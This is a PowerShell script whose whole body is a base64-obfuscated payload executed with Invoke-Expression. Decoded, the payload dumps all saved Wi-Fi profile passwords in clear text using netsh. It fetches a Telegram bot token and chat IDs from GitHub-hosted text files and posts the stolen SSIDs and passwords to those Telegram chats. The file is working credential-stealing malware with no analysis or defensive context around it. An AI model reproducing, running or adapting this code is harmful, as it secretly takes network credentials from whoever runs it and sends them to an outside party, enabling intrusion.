$encodedScript = 'IyBGdW5jdGlvbiB0byBnZXQgV0xBTiBwcm9maWxlcwpmdW5jdGlvbiBHZXQtV0xBTl9Qcm9maWxlcyB7CiAgICBwYXJhbSAoCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdlcy1FUycsJ2VuLUVOJyldCiAgICAgICAgJExBTkdVQUdFID0gJEhvc3QuQ3VycmVudFVJQ3VsdHVyZS5OYW1lCiAgICApCgogICAgJExBTkdVQUdFUyA9IEB7CiAgICAgICAgJ2VzLUVTJyA9IEB7CiAgICAgICAgICAgICd1c2VyX3Byb2ZpbGVzX3RleHQnICAgICAgID0gJ1BlcmZpbCBkZSB0b2RvcyBsb3MgdXN1YXJpb3MnCiAgICAgICAgICAgICdwcm9maWxlX25vdF9mb3VuZF90ZXh0JyAgID0gJ05vIHNlIGVuY3VlbnRyYSBlbCBwZXJmaWwnCiAgICAgICAgICAgICdzc2lkX25hbWVfdGV4dCcgICAgICAgICAgID0gJ05vbWJyZSBkZSBTU0lEJwogICAgICAgICAgICAnbmV0d29ya190eXBlX3RleHQnICAgICAgICA9ICdUaXBvIGRlIHJlZCcKICAgICAgICAgICAgJ2F1dGhlbnRpY2F0aW9uX3RleHQnICAgICAgPSAnQXV0ZW50aWNhY2nDs24nCiAgICAgICAgICAgICdlbmNyeXB0aW9uX3RleHQnICAgICAgICAgID0gJ0NpZnJhZG8nCiAgICAgICAgICAgICdrZXlfdGV4dCcgICAgICAgICAgICAgICAgID0gJ0NvbnRlbmlkbyBkZSBsYSBjbGF2ZScKICAgICAgICB9CiAgICAgICAgJ2VuLUVOJyA9IEB7CiAgICAgICAgICAgICd1c2VyX3Byb2ZpbGVzX3RleHQnICAgICAgID0gJ0FsbCBVc2VyIFByb2ZpbGUnCiAgICAgICAgICAgICdwcm9maWxlX25vdF9mb3VuZF90ZXh0JyAgID0gJ1Byb2ZpbGUgbm90IGZvdW5kJwogICAgICAgICAgICAnc3NpZF9uYW1lX3RleHQnICAgICAgICAgICA9ICdTU0lEIG5hbWUnCiAgICAgICAgICAgICduZXR3b3JrX3R5cGVfdGV4dCcgICAgICAgID0gJ05ldHdvcmsgVHlwZScKICAgICAgICAgICAgJ2F1dGhlbnRpY2F0aW9uX3RleHQnICAgICAgPSAnQXV0aGVudGljYXRpb24nCiAgICAgICAgICAgICdlbmNyeXB0aW9uX3RleHQnICAgICAgICAgID0gJ0NpcGhlcicKICAgICAgICAgICAgJ2tleV90ZXh0JyAgICAgICAgICAgICAgICAgPSAnS2V5IENvbnRlbnQnCiAgICAgICAgfQogICAgfQoKICAgICRMQU5HID0gJExBTkdVQUdFUy4iJExBTkdVQUdFIgoKICAgIGZ1bmN0aW9uIGdldFZhbHVlQnlOYW1lICgkaW5wdXRUZXh0LCAkbmFtZVN0cmluZykgewogICAgICAgICR2YWx1ZSA9ICIiCiAgICAgICAgaWYgKFtyZWdleF06OklzTWF0Y2goJGlucHV0VGV4dCwgIlxiJG5hbWVTdHJpbmdcYiIsICJJZ25vcmVDYXNlIikpIHsKICAgICAgICAgICAgJHZhbHVlID0gKFtyZWdleF06OlJlcGxhY2UoJGlucHV0VGV4dCwgIl5bXjpdKjogIiwiIikpIAogICAgICAgIH0KICAgICAgICByZXR1cm4gJHZhbHVlLlRyaW0oKQogICAgfQoKICAgICRQcm9maWxlcyA9IEAoKQogICAgbmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRwcm9maWxlID0gZ2V0VmFsdWVCeU5hbWUgJF8gJExBTkdbJ3VzZXJfcHJvZmlsZXNfdGV4dCddCiAgICAgICAgaWYgKCRwcm9maWxlKSB7CiAgICAgICAgICAgICRQcm9maWxlcyArPSAkcHJvZmlsZQogICAgICAgIH0KICAgIH0KCiAgICAkV0xBTl9Qcm9maWxlcyA9IEAoKQogICAgJHJvd051bWJlciA9IC0xCiAgICAkUHJvZmlsZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJHdsYW5fUHJvZmlsZSA9IG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlICRfIGtleT1jbGVhcgogICAgICAgIGlmICgkd2xhbl9Qcm9maWxlLkNvbnRhaW5zKCRMQU5HWydwcm9maWxlX25vdF9mb3VuZF90ZXh0J10pKSB7CiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0KICAgICAgICAkSW50ZXJmYWNlTmFtZSA9ICRudWxsCiAgICAgICAgJHdsYW5fUHJvZmlsZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgaWYgKCEoJEludGVyZmFjZU5hbWUpKSB7CiAgICAgICAgICAgICAgICAkSW50ZXJmYWNlTmFtZSA9IGdldFZhbHVlQnlOYW1lICRfICRMQU5HWydzc2lkX25hbWVfdGV4dCddCiAgICAgICAgICAgICAgICAkSW50ZXJmYWNlTmFtZSA9ICRJbnRlcmZhY2VOYW1lLlRyaW0oJyInKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAoJEludGVyZmFjZU5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAkcm93ID0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgICAgICAgICAgICAgSW50ZXJmYWNlTmFtZSAgPSAkSW50ZXJmYWNlTmFtZQogICAgICAgICAgICAgICAgICAgICAgICBTU0lEICAgICAgICAgICA9ICRJbnRlcmZhY2VOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIEtleSAgICAgICAgICAgID0gIiIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJHJvd051bWJlciArPSAxCiAgICAgICAgICAgICAgICAgICAgJFdMQU5fUHJvZmlsZXMgKz0gJHJvdwogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICghKCRXTEFOX1Byb2ZpbGVzWyRyb3dOdW1iZXJdLktleSkpIHsKICAgICAgICAgICAgICAgICRLZXkgPSBnZXRWYWx1ZUJ5TmFtZSAkXyAkTEFOR1sna2V5X3RleHQnXQogICAgICAgICAgICAgICAgaWYgKCRLZXkpIHsKICAgICAgICAgICAgICAgICAgICAkV0xBTl9Qcm9maWxlc1skcm93TnVtYmVyXS5LZXkgPSAkS2V5CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgaWYgKCRXTEFOX1Byb2ZpbGVzLkNvdW50IC1ndCAwKSB7CiAgICAgICAgJHJlc3VsdE1lc3NhZ2UgPSAi8J+UkiBDb250cmFzZcOxYXMgV2lGaSBlbmNvbnRyYWRhczpgcmBuIgogICAgICAgICRyZXN1bHRNZXNzYWdlICs9ICJBdXRvcjogTHVpc2hpw7FvIFBlcmljZW5hYHJgbk3DoXMgaW5mb3JtYWNpw7NuOiBbQmxvZ10oaHR0cHM6Ly9scGVyaWNlbmEuYmxvZ3Nwb3QuY29tLylgcmBuYHJgbiIKICAgICAgICAkV0xBTl9Qcm9maWxlcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJHJlc3VsdE1lc3NhZ2UgKz0gIlNTSUQ6ICQoJF8uU1NJRClgcmBuQ29udHJhc2XDsWE6ICQoJF8uS2V5KWByYG5gcmBuIgogICAgICAgIH0KICAgICAgICBXcml0ZS1Ib3N0ICJUb3RhbCBXTEFOX1Byb2ZpbGVzOiAkKCRXTEFOX1Byb2ZpbGVzLkNvdW50KSIKICAgICAgICByZXR1cm4gJHJlc3VsdE1lc3NhZ2UKICAgIH0gZWxzZSB7CiAgICAgICAgcmV0dXJuICdObyBzZSBlbmNvbnRyYXJvbiBwZXJmaWxlcyBXTEFOLicKICAgIH0KfQoKIyBGdW5jdGlvbiB0byBzZW5kIGEgbWVzc2FnZSB0byBUZWxlZ3JhbQpmdW5jdGlvbiBTZW5kLVRlbGVncmFtTWVzc2FnZSB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kdG9rZW4sCiAgICAgICAgW3N0cmluZ10kY2hhdElkLAogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UKICAgICkKCiAgICAkdXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkdG9rZW4vc2VuZE1lc3NhZ2UiCgogICAgJHBhcmFtcyA9IEB7CiAgICAgICAgY2hhdF9pZCA9ICRjaGF0SWQKICAgICAgICB0ZXh0ID0gJG1lc3NhZ2UKICAgIH0KCiAgICB0cnkgewogICAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHVybCAtTWV0aG9kIFBvc3QgLUJvZHkgJHBhcmFtcwogICAgICAgIFdyaXRlLUhvc3QgIk1lc3NhZ2Ugc2VudCB0byBjaGF0IElEOiAkY2hhdElkIgogICAgfSBjYXRjaCB7CiAgICAgICAgV3JpdGUtSG9zdCAiRmFpbGVkIHRvIHNlbmQgbWVzc2FnZSB0byBjaGF0IElEOiAkY2hhdElkIgogICAgICAgIFdyaXRlLUhvc3QgJF8uRXhjZXB0aW9uLk1lc3NhZ2UKICAgIH0KfQoKIyBEZXNjYXJnYXIgYXJjaGl2b3MgZGUgY29uZmlndXJhY2nDs24KJHRva2VuQ29uZmlnVXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QZXJpY2VuYS9oYXBweWJpcnRoZGF5LmdpdGh1Yi5pby9tYWluL2RhdG9zL2NvbmZpZzIudHh0IgokY2hhdElkc1VybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUGVyaWNlbmEvaGFwcHliaXJ0aGRheS5naXRodWIuaW8vbWFpbi9kYXRvcy91c3VhcmlvL2x1aXNoaW5vLnR4dCIKCiR0b2tlbkNvbmZpZyA9IChJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR0b2tlbkNvbmZpZ1VybCkuQ29udGVudC5UcmltKCkKJGNoYXRJZHMgPSAoSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkY2hhdElkc1VybCkuQ29udGVudCAtc3BsaXQgImBuIiB8IEZvckVhY2gtT2JqZWN0IHsgJF8uVHJpbSgpIH0KCiMgUnVuIHRoZSBHZXQtV0xBTl9Qcm9maWxlcyBmdW5jdGlvbiBhbmQgc3RvcmUgdGhlIHJlc3VsdAokcmVzdWx0ID0gR2V0LVdMQU5fUHJvZmlsZXMKCiMgU2VuZCB0aGUgcmVzdWx0IGFzIGEgbWVzc2FnZSB0byBlYWNoIGNoYXQgSUQKZm9yZWFjaCAoJGNoYXRJZCBpbiAkY2hhdElkcykgewogICAgU2VuZC1UZWxlZ3JhbU1lc3NhZ2UgLXRva2VuICR0b2tlbkNvbmZpZyAtY2hhdElkICRjaGF0SWQgLW1lc3NhZ2UgJHJlc3VsdAp9Cg=='
$scriptContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $scriptContent
